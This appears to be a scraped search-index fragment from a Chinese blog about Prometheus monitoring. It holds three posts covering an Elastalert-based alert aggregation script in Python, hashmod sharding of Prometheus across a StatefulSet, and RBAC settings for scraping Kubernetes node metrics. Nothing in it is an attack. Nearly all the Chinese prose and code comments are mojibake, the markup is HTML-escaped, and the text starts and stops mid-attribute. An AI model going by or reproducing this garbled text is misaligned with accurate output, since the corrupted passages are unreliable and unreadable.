&lt;p&gt;æˆ‘ä»¬åº”ç”¨å‘Šè­¦ä¸»è¦é‡‡ç”¨Prometheusï¼ŒåŸºäºAlertmanageråšäº†åŸºäºalertnameã€instanceå’Œpodçš„åˆ†ç»„èšåˆè¦†ç›–å®¹å™¨å’Œè‡ªå®šä¹‰æŒ‡æ ‡çš„åˆ†ç»„èšåˆï¼Œä»¥åŠæ ¹æ®å®šä¹‰çš„çº§åˆ«è¿›è¡Œäº†åŒç»„ã€åŒæœºå™¨ã€åŒé›†ç¾¤é«˜çº§åˆ«é™é»˜ä½çº§åˆ«&lt;br&gt;
å‚è€ƒ: https://www.noalert.cn/post/ru-he-yong-yuan-sheng-prometheus-jian-kong-da-gui-mo-kubernetes-ji-qun/&lt;/p&gt;
&lt;h1 id=&#34;é’ˆå¯¹ä¸šåŠ¡å‘Šè­¦&#34;&gt;é’ˆå¯¹ä¸šåŠ¡å‘Šè­¦ï¼š&lt;/h1&gt;
&lt;p&gt;é€»è¾‘æ¶æ„:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617864543945.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¸šåŠ¡æ¨¡å—:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617864150672.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æˆ‘ä»¬çš„ä¸šåŠ¡å‘Šè­¦å…¨éƒ¨æ˜¯åŸºäºç°ç½‘æ—¥å¿—å»åšçš„ç›‘æ§å‘Šè­¦åˆ†æ,ç°ç½‘åŸºæœ¬è¦†ç›–æ‰€æœ‰ç»„ä»¶çš„æ€§èƒ½æ—¥å¿—å’Œä¸šåŠ¡æ—¥å¿—ã€‚å¯¹äºæ¶ˆè´¹é“¾è·¯ã€æ¶ˆè´¹è¿‡ç¨‹ä¸­çš„é—®é¢˜å’Œæ‰“æ—¥å¿—çš„è§„èŒƒé—®é¢˜ä¸åšé˜è¿°&lt;/p&gt;
&lt;h2 id=&#34;ä¸šåŠ¡å‘Šè­¦è§„åˆ™&#34;&gt;ä¸šåŠ¡å‘Šè­¦è§„åˆ™ï¼š&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;åŸºäºç»™å®šçš„çŠ¶æ€ç æˆ–è€—æ—¶è¿›è¡Œå…¨é‡æ—¥å¿—çš„æ¯”ä¾‹åˆ†æå’Œå…³é”®è¯æå–&lt;/li&gt;
&lt;li&gt;å‘Šè­¦æ£€æµ‹æ—¶é—´ é»˜è®¤ä¸€åˆ†é’Ÿ&lt;/li&gt;
&lt;li&gt;å‘Šè­¦æ£€æµ‹å…¨é‡æ•°æ®é»˜è®¤ä¸ºtype:_doc,éƒ¨åˆ†è‡ªå®šä¹‰&lt;/li&gt;
&lt;li&gt;å‘Šè­¦è§„åˆ™å¸¦æœ‰ä¸šåŠ¡æ¨¡å—å±æ€§&lt;/li&gt;
&lt;li&gt;å‘Šè­¦è§„åˆ™å¸¦æœ‰å‘Šè­¦æ¨é€åœ°å€&lt;/li&gt;
&lt;li&gt;å‘Šè­¦è§„åˆ™å¸¦æœ‰æ£€æµ‹æ¯”ä¾‹å±æ€§&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ä¸šåŠ¡è§„åˆ™æ¨¡æ¿&#34;&gt;ä¸šåŠ¡è§„åˆ™æ¨¡æ¿&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;index: access-xxxx-*
name: aiuiathenaosstimeout
type: percentage_match

percentage_config:
  items:
    é«˜: [5, 100]
    ä¸­: [1, 5]
    ä½: [0.1, 1]
percentage_format_string: &amp;quot;%.3f&amp;quot;
match_min_num: 10
aiui_group: [&#39;aiui-athena-nlu&#39;]
minutes: 1

filter:
- term:
    _type: doc
match_bucket_filter:
- terms:
    ret: [11004]
http_post_url: &amp;quot;http://xxxxxxx:8088/alert&amp;quot;
http_post_static_payload:
    subject: ä¸Šæµ·-å…¥å£-ç»„ä»¶åç§°-11004å¼‚å¸¸çŠ¶æ€ç ç›‘æ§
    message: ä¸Šæµ·-ç»„ä»¶å¼‚å¸¸ret-11004
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ä¸šåŠ¡å‘Šè­¦æ ¼å¼&#34;&gt;ä¸šåŠ¡å‘Šè­¦æ ¼å¼&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-{&#39;match_count&#39;:&#34;&gt;_group&#39;: [&#39;athena&#39;, &#39;aiui-test&#39;], &#39;_level&#39;: &#39;ä½&#39;, &#39;num_matches&#39;: 1, &#39;message&#39;: &#39;å‘Šè­¦ä¿¡æ¯äºŒ&#39;, &#39;match_percentage&#39;: &#39;0.110&#39;, &#39;subject&#39;: &#39;å‘Šè­¦æ ‡
é¢˜äºŒ&#39;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;talking-is-cheap-show-me-code&#34;&gt;talking is cheap show me code&lt;/h1&gt;
&lt;p&gt;##ä»£ç ç¯å¢ƒ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python tornado æ¡†æ¶&lt;/li&gt;
&lt;li&gt;elastalert&lt;br&gt;
##ä¸»ä½“æ›´æ”¹&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;AGG_LOOP_MS = 65000  #æ¯«ç§’
MAX_AGG_SECONDS = 3600 #ç§’
ALERT_TTL = 90 #ç§’
EVENT_LOG_FILE =  &amp;quot;./test.log&amp;quot;

now = time.time()
unique_value = str(random.randint(0, 3000000000))
#unique_value = str(random.sample(&#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;, 8))
logger = EventLogger(EVENT_LOG_FILE)
logger.write(now, &amp;quot;alert&amp;quot;, &amp;quot;merge&amp;quot;, unique_value, ALERT_TTL, json.dumps(data,ensure_ascii=False))
#æ¡†æ¶è°ƒç”¨
ioloop.PeriodicCallback(cronjob_aggregation, AGG_LOOP_MS).start()
ioloop.IOLoop.current().start()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;event_loggerpy-å‘Šè­¦å†™å…¥å’Œè¯»å–&#34;&gt;event_logger.py #å‘Šè­¦å†™å…¥å’Œè¯»å–&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;#!python3
# -*- coding: utf-8 -*-
import json
import os
import pathlib
import requests

TS = 0
EVENT_TYPE = 1
STATUS = 2
UNIQ_VALUE = 3
TTL = 4
MSG = 5
class EventLogger(object):
    file_path = &amp;quot;&amp;quot;
    content = []

    def __init__(self, file_path):
        self.file_path = file_path
        self.read()

    def __del__(self):
        pass

    def write(self, ts, event_type, status, uniq_value, ttl, msg):
        if isinstance(msg, dict):
            msg = json.dumps(msg)
        with open(self.file_path, &amp;quot;a+&amp;quot;) as f:
            ts = int(ts)
            ttl = int(ttl)
            f.write(&amp;quot;{};{};{};{};{};{}\n&amp;quot;.format(ts, event_type, status, uniq_value, ttl, msg))
            self.content.append((ts, event_type, status, uniq_value, ttl, msg))
            print &amp;quot;alert insert ok&amp;quot;

    def read(self):
        if not os.path.isfile(self.file_path):
            pathlib.Path(self.file_path).touch()
        with open(self.file_path, &amp;quot;r&amp;quot;) as f:
            self.content = []
            #for l in f.readlines():
            for l in f.read().splitlines():
                l = l.split(&amp;quot;;&amp;quot;)
                info = l[:MSG]
                info[TS] = int(info[TS])
                info[TTL] = int(info[TTL])
                msg = &amp;quot;;&amp;quot;.join(l[MSG:])
                self.content.append((info + [msg]))
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;èšåˆæ ¸å¿ƒéƒ¨åˆ†&#34;&gt;èšåˆæ ¸å¿ƒéƒ¨åˆ†ï¼š&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;def cronjob_aggregation():
    logger = EventLogger(EVENT_LOG_FILE)
    content = [x for x in logger.content]
    content.reverse()
    now = time.time()
    left_time = now - MAX_AGG_SECONDS

    msg_to_send = defaultdict(list)
    wechatid_to_send = list()
    already_send_set = dict()
    to_group = 0
    # è·å–æ‰€æœ‰æ²¡æœ‰å‘é€çš„èšåˆæ¶ˆæ¯
    for row in content:
        if row[TS] &amp;lt; left_time:
            break  # è¶…è¿‡æ”¯æŒçš„æœ€å¤§æ¶ˆæ¯è¿‡æœŸæ—¶é—´å°±ä¸å¤„ç†äº†
        if row[EVENT_TYPE] == &amp;quot;alert&amp;quot; and row[STATUS] == &amp;quot;merge&amp;quot; and row[UNIQ_VALUE] not in already_send_set:
            msg_to_send[row[UNIQ_VALUE]].append(row)
        if row[EVENT_TYPE] == &amp;quot;alert&amp;quot; and row[STATUS] == &amp;quot;send&amp;quot; and row[UNIQ_VALUE] not in already_send_set:
            already_send_set[row[UNIQ_VALUE]] = int(row[TTL]) + int(row[TS])  # æ ‡è®°æ¯ä¸ªèšåˆæ¶ˆæ¯çš„è¶…æ—¶æ—¶é—´
        if &#39;aiui_group&#39; in json.loads(row[MSG]).keys() and row[UNIQ_VALUE] not in already_send_set:
            wechatid_to_send.append(parse_user_info(json.loads(row[MSG]))[&#39;id&#39;])
        if &#39;level&#39; in json.loads(row[MSG]) and row[UNIQ_VALUE] not in already_send_set:
           if json.loads(row[MSG])[&#39;level&#39;].encode(&amp;quot;utf-8&amp;quot;) in [&amp;quot;é«˜&amp;quot;,&amp;quot;disaster&amp;quot;]:
              to_group = 1

    # å‘é€è¿™äº›æ¶ˆæ¯
    alert_content = &#39;&#39;
    list_alert_content = []
    level_list = []
    for k, v in msg_to_send.items():
        if int(time.time()) &amp;lt;= already_send_set.get(k, 0):
            continue  # æ²¡åˆ°è¶…æ—¶æ—¶é—´çš„ç›´æ¥è·³è¿‡
        msg_decoded = [json.loads(x[MSG]) for x in v]
        list_alert_content += [x[&amp;quot;message&amp;quot;] for x in msg_decoded]
        alert_content = &#39;\n&#39;.join(list_alert_content)
        subject = &amp;quot;[èšåˆæ¶ˆæ¯] {}&amp;quot;.format(msg_decoded[-1][&amp;quot;subject&amp;quot;])
        logger.write(now, &amp;quot;alert&amp;quot;, &amp;quot;send&amp;quot;, k, v[-1][TTL], json.dumps({&amp;quot;subject&amp;quot;:subject, &amp;quot;message&amp;quot;:alert_content},ensure_ascii=False))
    if msg_to_send.items() and len(msg_to_send.items()) &amp;gt; 1 and to_group == 1:
       subject += &#39; å…±&#39;+str(len(msg_to_send.items())) +&#39;æ¡å‘Šè­¦&#39;
       send2tag(subject.encode(&amp;quot;utf-8&amp;quot;),alert_content,&#39;|&#39;.join(wechatid_to_send))
       send2group(subject.encode(&amp;quot;utf-8&amp;quot;),alert_content)
    elif msg_to_send.items() and len(msg_to_send.items()) &amp;gt; 1 and to_group == 0:
       subject += &#39; å…±&#39;+str(len(msg_to_send.items())) +&#39;æ¡å‘Šè­¦&#39;
       send2tag(subject.encode(&amp;quot;utf-8&amp;quot;),alert_content,&#39;|&#39;.join(wechatid_to_send))
    else:
       subject = &amp;quot;[ä¸šåŠ¡å‘Šè­¦] {}&amp;quot;.format(msg_decoded[-1][&amp;quot;subject&amp;quot;])
       send2tag(subject.encode(&amp;quot;utf-8&amp;quot;),alert_content,&#39;|&#39;.join(wechatid_to_send))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;è¿˜å¯ä»¥æ ¹æ®é‡è¦çš„å‘Šè­¦çº§åˆ«è¿›è¡ŒTTLæ—¶é—´å†…çš„é«˜çº§åˆ«å‘Šè­¦å¬å›ï¼Œä»£ç å¦‚ä¸Šæ›´æ”¹æå–æ•°æ®å’Œå‘é€è§„åˆ™å³å¯&lt;/strong&gt;&lt;/p&gt;
">ã€ç›‘æ§ã€‘å‘Šè­¦èšåˆ|å‘Šè­¦å¬å›åŠŸèƒ½å®ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/shi-jian-prometheus-ri-jian-zeng-chang-de-nei-cun-ru-he-zuo-hash-fen-chi/"" data-c="
          &lt;p&gt;Prometheuså”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯ç›‘æ§é¡¹è¶Šæ¥è¶Šå¤šçš„æƒ…å†µä¸‹,å†…å­˜æ¶ˆè€—æ˜¯å¾ˆå¤§çš„,å¦‚æœæ ¹æ®æŒ‡æ ‡é¡¹è¿›è¡Œæœé›†åˆ†å‰²ï¼Ÿ&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h1 id=&#34;è½ç›˜è®¾è®¡&#34;&gt;è½ç›˜è®¾è®¡ï¼š&lt;/h1&gt;
&lt;p&gt;Prometheusåœ¨æ•°æ®è½ç›˜çš„æµç¨‹ä¸Šè¿›è¡Œäº†ä¸€å®šçš„è€ƒè™‘ã€‚&lt;br&gt;
å®Œæ•´çš„æ•°æ®æµç¨‹åº”è¯¥æ˜¯:pull-&amp;gt;prometheus-&amp;gt;memory-&amp;gt;wal-&amp;gt;tsdb-&amp;gt;filesystem.&lt;br&gt;
æ­£å¸¸çš„æƒ…å†µä¸‹ï¼ŒPrometheusä¼šæŠŠæœ€æ–°æœé›†åˆ°çš„æ•°æ®æ”¾åœ¨å†…å­˜ä¸­ï¼Œé’ˆå¯¹æœé›†é‡è¾ƒå¤§ï¼Œmetricså†…åŒ…å«è¾ƒå¤§ã€è¾ƒå¤šlabelçš„å’Œç›‘æ§é¡¹ time seriesè¾ƒå¤šçš„ç›‘æ§æŒ‡æ ‡æ¥è¯´å­˜åœ¨å†…å­˜é‡Œæ˜¯ä¸å¤ªå‹å¥½çš„ï¼Œä¼šå ç”¨è¾ƒé«˜çš„å†…å­˜ä½¿ç”¨ï¼ŒåŒæ—¶å†…å­˜é‡Œé¢ä¹Ÿä¼šå­˜å‚¨ç›¸å¯¹è¾ƒè€è¿˜æ²¡æœ‰è½ç›˜çš„æ•°æ®ã€‚ä»¥t0-t1ä¸ºæœ€æ–°æ—¶é—´ï¼Œt1-t2ä¸ºè¾ƒè€æ—¶é—´ï¼Œt3,t4... å†…å­˜ä¸­: (t0-t1çš„series+t1-t2çš„series)&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617867267806.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆå¸¦æ¥çš„é—®é¢˜å°±æ¥äº†ï¼š&lt;br&gt;
1.å¦‚æœPrometheusé‡å¯æ€ä¹ˆåŠï¼Ÿ&lt;br&gt;
å¦‚æœPrometheusé‡å¯çš„è¯ï¼ŒPrometheusæœ¬åœ°ä¼šæœ‰ç¼“å­˜æ–‡ä»¶WALå­˜å‚¨è¿˜æœªè½ç›˜çš„æ•°æ®ï¼Œä¸€èˆ¬æ¥è¯´ä¸ä¼šé€ æˆå¤§é‡çš„æ•°æ®ä¸¢å¤±ï¼Œä½†æ˜¯åœ¨ä¸€å®šçš„æ•°æ®é‡ä¸‹ï¼ŒPrometheusé‡å¯ä¼šè¿›è¡ŒWALæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼ŒåŠ è½½è¿‡ç¨‹ä¼šé€ æˆ1-2ä¸ªæ‹‰å–é—´éš”çš„æ•°æ®ä¸¢å¤±ï¼Œå‡ºç°æ–­å±‚ã€‚åŒæ—¶æ ¹æ®æ•°æ®é‡å¤§å°ä¸åŒï¼ŒåŠ è½½æ—¶é—´ä¹Ÿä¼šä¸ä¸€æ ·&lt;br&gt;
2.å¦‚æœæŸ¥è¯¢æ›´åŠ ä¹…è¿œçš„æ•°æ®æ€ä¹ˆåŠï¼Ÿ&lt;br&gt;
Prometheuså¯¹äºæ›´åŠ ä¹…è¿œçš„æ•°æ®æŸ¥è¯¢æ–¹å¼æ˜¯ä»filesystem-&amp;gt;tsdb-&amp;gt;Memoryçš„æ–¹å¼,å¦‚æœå¯¹äºä¸€äº›time seriesè¾ƒå¤šçš„æŒ‡æ ‡æ¥è¯´ï¼Œå‹åŠ›æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œæ­¤æ—¶å†…å­˜ä¸­(æŸ¥è¯¢çš„time series+æ–°æ‹‰å–çš„time series),æ‰€æœ‰ä¼šå‘ç°æ ¹æ®æŸ¥è¯¢æ•°æ®é‡çš„ä¸åŒå†…å­˜ä¼šæœ‰ä¸åŒç¨‹åº¦çš„ä¸Šå‡ï¼Œå¾ˆå¤§çš„å¯èƒ½æ’‘çˆ†å†…å­˜è¿›è¡Œé‡å¯ã€‚&lt;br&gt;
3.å¦‚æœè½ç›˜+å†…å­˜ä¸è¶³æ€ä¹ˆåŠ&lt;br&gt;
å¦‚æœå¯¹äºæ–°æ‹‰å–æ•°æ®æ¥ä¸åŠè½ç›˜å°±ä¼šè¿›è¡Œé‡å¯ã€OOMç­‰ï¼Œé‚£è¿™ä¸ªæ—¶å€™æœ‰å¿…è¦æ‰©å¤§å†…å­˜æˆ–è€…è¿›è¡Œåˆ†ç¦»äº†&lt;/p&gt;
&lt;h1 id=&#34;é’ˆå¯¹å†…å­˜é—®é¢˜è¿›è¡Œåˆ†ç¦»&#34;&gt;é’ˆå¯¹å†…å­˜é—®é¢˜è¿›è¡Œåˆ†ç¦»&lt;/h1&gt;
&lt;h2 id=&#34;æ¶æ„ç­–ç•¥&#34;&gt;æ¶æ„ç­–ç•¥&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://amendge.github.io/post-images/1617867218714.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;é€»è¾‘&#34;&gt;é€»è¾‘&lt;/h2&gt;
&lt;p&gt;1.å°†æ‰€æœ‰è¦æ‹‰èµ·çš„targetç­‰ä¿¡æ¯æ‰“å¥½æ ‡ç­¾æ³¨å†Œåˆ°consul&lt;br&gt;
2.Prometheusé€šè¿‡hashmodæ–¹å¼åˆ†å—æ‹‰å–consulé…ç½®&lt;br&gt;
3.æ¯ä¸ªå•ç‹¬Prometheuséƒ½ä¼šæ‹‰å–ä¸åŒäºå…¶ä»–çš„é…ç½®&lt;br&gt;
4.æœ€å¥½å¯¹æ¯ä¸ªå•ç‹¬çš„Prometheusåšæ•°æ®æ±‡æ€»æˆ–è€…æŸ¥è¯¢æ±‡æ€»&lt;/p&gt;
&lt;h2 id=&#34;æ­¥éª¤ä»¥k8séƒ¨ç½²ä¸ºä¾‹&#34;&gt;æ­¥éª¤(ä»¥K8Séƒ¨ç½²ä¸ºä¾‹)&lt;/h2&gt;
&lt;p&gt;1.é’ˆå¯¹å®˜æ–¹çš„é•œåƒæ–°å¢hashmodæ¨¡å—åˆ†é…å€¼&lt;br&gt;
Dockerfile:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FROM  prometheus/prometheus:2.20.0
MAINTAINER name gecailong

COPY ./entrypoint.sh /bin

ENTRYPOINT [&amp;quot;/bin/entrypoint.sh&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;entrypoint.shï¼š

#!/bin/sh

ID=${POD_NAME##*-}

cp /etc/prometheus/prometheus.yml /prometheus/prometheus-hash.yml

sed -i &amp;quot;s/ID_NUM/$ID/g&amp;quot; /prometheus/prometheus-hash.yml

/bin/prometheus --config.file=/prometheus/prometheus-hash.yml --query.max-concurrency=20 --storage.tsdb.path=/prometheus --storage.tsdb.max-block-duration=2h --storage.tsdb.min-block-duration=2h  --storage.tsdb.retention=2h --web.listen-address=:9090 --web.enable-lifecycle --web.enable-admin-api
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;IDNUMï¼š ä¸ºæˆ‘ä»¬åé¢é…ç½®åšå‡†å¤‡&lt;/strong&gt;&lt;br&gt;
2.Prometheuséƒ¨ç½²&lt;br&gt;
Prometheusé…ç½®æ–‡ä»¶:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  prometheus.yml: |
    global:
      scrape_interval:     15s
      evaluation_interval: 15s

      external_labels:
         monitor: &#39;k8s-sh-prod&#39;
         service: &#39;k8s-all&#39;
         ID: &#39;ID_NUM&#39;
         ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªIDæ˜¯ä¸ºäº†æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™å¯ä»¥åŒºåˆ†åŒæ—¶ä¹Ÿå¯ä»¥ä½œä¸ºç­‰ä¸‹hashmodæ¨¡å—çš„å¯¹åº”å€¼&lt;/p&gt;
&lt;p&gt;ä»¥æ‹‰å–Nodeä¿¡æ¯ä¸ºä¾‹:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    - job_name: &#39;kubernetes-nodes&#39;
      kubernetes_sd_configs:
      - role: node
      scheme: https
      tls_config:
        insecure_skip_verify: true
      bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
      relabel_configs:
      - action: labelmap
        regex: __meta_kubernetes_node_label_(.+)
      - source_labels: [__meta_kubernetes_node_address_InternalIP]
        regex: (.+)
        target_label: __address__
        replacement: ${1}:10250 
      - source_labels: [__meta_kubernetes_node_name]
        regex: (.+)
        target_label: __metrics_path__
        replacement: /metrics
        #ä»¥ä¸‹ä¸ºhashmodé…ç½®éƒ¨åˆ†
      - source_labels: [__meta_kubernetes_node_name]
        modulus:       10   #è¦åˆ†æˆçš„æ¨¡å—æ€»æ•°
        target_label:  __tmp_hash
        action:        hashmod
      - source_labels: [__tmp_hash]
        regex:         ID_NUM  #å½“å‰æ‰€å±æ¨¡å—æ•°
        action:        keep
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;éƒ¨ç½²æ–‡ä»¶:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: apps/v1
kind: StatefulSet
metadata:
  labels:
    app: prometheus
  name: prometheus-sts
  namespace: monitoring
spec:
  serviceName: &amp;quot;prometheus&amp;quot;
  replicas: 10   #hashmodæ€»æ¨¡å—æ•°
  selector:
    matchLabels:
      app: prometheus
  template:
    metadata:
      labels:
        app: prometheus
    spec:
      containers:
      - image: prometheus:2.20.0-hash
        name: prometheus
        securityContext:
           runAsUser: 0
        command:
        - &amp;quot;/bin/entrypoint.sh&amp;quot;  #hashmodè„šæœ¬æ‰§è¡Œ
        env:
        - name: POD_NAME   #æ ¹æ®statefulsetçš„ç‰¹æ€§ä¼ å…¥PODåç§°ç”¨äºæ¨¡å—å–å€¼
          valueFrom:
            fieldRef:
              apiVersion: v1
              fieldPath: metadata.name
        ports:
        - name: http
          containerPort: 9090
          protocol: TCP
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é’ˆå¯¹æ•°æ®å­˜å‚¨å’ŒæŸ¥è¯¢çš„é—®é¢˜å¯ä»¥é€šè¿‡Thanosè¿›è¡ŒæŸ¥è¯¢èšåˆï¼Œä¹Ÿå¯ä»¥é€šè¿‡victoriametricsè¿›è¡Œæ•°æ®å­˜å‚¨çš„èšåˆåœ¨grafanaç•Œé¢è¿›è¡Œç»Ÿä¸€çš„æŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;é’ˆå¯¹å†…å­˜é—®é¢˜è¿›è¡Œåˆ†ç¦»&lt;/p&gt;
">ã€å®è·µã€‘Prometheusæ—¥æ¸å¢é•¿çš„å†…å­˜å¦‚ä½•åšhashåˆ†ç¦»</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/ru-he-yong-yuan-sheng-prometheus-jian-kong-da-gui-mo-kubernetes-ji-qun/"" data-c="
          &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://amendge.github.io/post-images/1617861678108.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;!-- more --&gt;
&lt;p&gt;æ¦‚è¿°&lt;br&gt;
å¯¹äºPrometheusçš„ç»„ä»¶èƒ½åŠ›æ˜¯æ¯‹åº¸ç½®ç–‘çš„ï¼Œä½†æ˜¯ä½¿ç”¨ä¹…äº†ä¼šå‘ç°å¾ˆå¤šçš„æ€§èƒ½é—®é¢˜ï¼Œè¯¸å¦‚å†…å­˜é—®é¢˜ã€å¤§è§„æ¨¡æ‹‰å–é—®é¢˜ã€å¤§è§„æ¨¡å­˜å‚¨é—®é¢˜ç­‰ç­‰&lt;/p&gt;
&lt;p&gt;å¦‚ä½•åŸºäºäº‘åŸç”ŸPrometheusè¿›è¡ŒK8Sé›†ç¾¤åŸºç¡€ç›‘æ§å¤§è§„æ¨¡æ•°æ®æ‹‰å–æœ¬æ–‡å°†ä¼šç»™å‡ºå½“å‰ç­”æ¡ˆ&lt;/p&gt;
&lt;h1 id=&#34;æ¶æ„å›¾&#34;&gt;æ¶æ„å›¾&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://amendge.github.io/post-images/1617861700664.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æˆ‘ä»¬å½“å‰çš„ç›‘æ§å¹³å°æ¶æ„å›¾ï¼Œæ ¹æ®æ¶æ„å›¾å¯ä»¥çœ‹å‡ºæˆ‘ä»¬å½“å‰çš„ç›‘æ§å¹³å°ç»“åˆäº†å¤šä¸ªæˆç†Ÿå¼€æºç»„ä»¶å’Œèƒ½åŠ›å®Œæˆäº†å½“å‰é›†ç¾¤çš„æ•°æ®+æŒ‡æ ‡+å±•ç¤ºçš„å·¥ä½œ&lt;br&gt;
å½“å‰æˆ‘ä»¬ç›‘æ§ä¸åŒçš„K8Sé›†ç¾¤ï¼ŒåŒ…å«ä¸åŒåŠŸèƒ½ã€ä¸åŒä¸šåŠ¡çš„é›†ç¾¤ï¼ŒåŒ…å«ä¸šåŠ¡ã€åŸºç¡€å’Œå‘Šè­¦ä¿¡æ¯&lt;/p&gt;
&lt;h1 id=&#34;é’ˆå¯¹k8sé›†ç¾¤ç›‘æ§&#34;&gt;é’ˆå¯¹K8Sé›†ç¾¤ç›‘æ§&lt;/h1&gt;
&lt;p&gt;æˆ‘ä»¬é‡‡ç”¨å¸¸è§çš„2ç§ç›‘æ§æ¶æ„ä¹‹ä¸€ï¼š&lt;br&gt;
1.Prometheus-operator&lt;br&gt;
2.Prometheuså•ç‹¬é…ç½®(é€‰æ‹©çš„æ¶æ„)&lt;br&gt;
tips:å¯¹äºPrometheus-operator ç¡®å®æ˜“äºéƒ¨ç½²åŒ–ã€ç®€å•çš„servicemonitorçœäº†å¾ˆå¤§çš„åŠ›æ°”,ä¸è¿‡å¯¹äºæˆ‘ä»¬è¿™æ ·å¤šç§ç§æœ‰åŒ–é›†ç¾¤æ¥è¯´ç»´æŠ¤æˆæœ¬ç¨å¾®æœ‰ç‚¹é«˜,æˆ‘ä»¬é€‰æ‹©ç¬¬äºŒç§æ–¹æ¡ˆæ›´å¤šçš„æ˜¯æƒ³çœç•¥åˆ›å»ºæœåŠ¡å‘ç°çš„æ­¥éª¤ï¼Œæ›´å¤šçš„é‡‡ç”¨æœåŠ¡å‘ç°ã€æœåŠ¡æ³¨å†Œçš„èƒ½åŠ›&lt;/p&gt;
&lt;h1 id=&#34;æ•°æ®æ‹‰å–&#34;&gt;æ•°æ®æ‹‰å–&lt;/h1&gt;
&lt;p&gt;åœ¨æ•°æ®æ‹‰å–æ–¹é¢æˆ‘ä»¬åšäº†ä¸€å®šçš„è°ƒæ•´ä¸ºäº†åº”å¯¹å¤§è§„æ¨¡èŠ‚ç‚¹æˆ–è€…æ•°æ®å¯¹äºapiserverçš„å¤§å‹åŠ›é—®é¢˜å’Œå¤§è§„æ¨¡æ•°æ®æ‹‰å–Prometheuså†…å­˜oomé—®é¢˜&lt;br&gt;
a.åˆ©ç”¨K8såšæœåŠ¡å‘ç°ï¼Œç›‘æ§æ•°æ®æ‹‰å–ç”±Prometheusä¹‹é—´æ‹‰å–ï¼Œé™ä½apiserveræ‹‰å–å‹åŠ›&lt;br&gt;
b.é‡‡ç”¨hashmodæ–¹å¼è¿›è¡Œåˆ†å¸ƒå¼æ‹‰å–ç¼“è§£å†…å­˜å‹åŠ›&lt;br&gt;
RBACæƒé™ä¿®æ”¹;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apiVersion: rbac.authorization.k8s.io/v1beta1
kind: ClusterRole
metadata:
  name: prometheus
  namespace: monitoring
rules:
- apiGroups: [&amp;quot;&amp;quot;]
  resources:
  - nodes
  - nodes/proxy
  - nodes/metrics #æ–°å¢è·¯å¾„ä¸ºäº†å¤–éƒ¨æ‹‰å–
  - nodes/metrics/cadvisor #æ–°å¢è·¯å¾„ä¸ºäº†å¤–éƒ¨æ‹‰å–
  - services
  - endpoints
  - pods
  verbs: [&amp;quot;get&amp;quot;, &amp;quot;list&amp;quot;, &amp;quot;watch&amp;quot;]
- apiGroups:
  - extensions
  resources:
  - ingresses
  verbs: [&amp;quot;get&amp;quot;, &amp;quot;list&amp;quot;, &amp;quot;watch&amp;quot;]
- nonResourceURLs: [&amp;quot;/metrics&amp;quot;]
  verbs: [&amp;quot;get&amp;quot;]
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: prometheus
  namespace: monitoring
---
apiVersion: rbac.authorization.k8s.io/v1beta1
kind: ClusterRoleBinding
metadata:
  name: prometheus
  namespace: monitoring
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: prometheus
subjects:
- kind: ServiceAccount
  name: prometheus
  namespace: monitoring

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;éœ€è¦æ–°å¢å¯¹äºNodeèŠ‚ç‚¹çš„/metricså’Œ/metrics/cadvsiorè·¯å¾„çš„æ‹‰å–æƒé™&lt;/code&gt;&lt;br&gt;
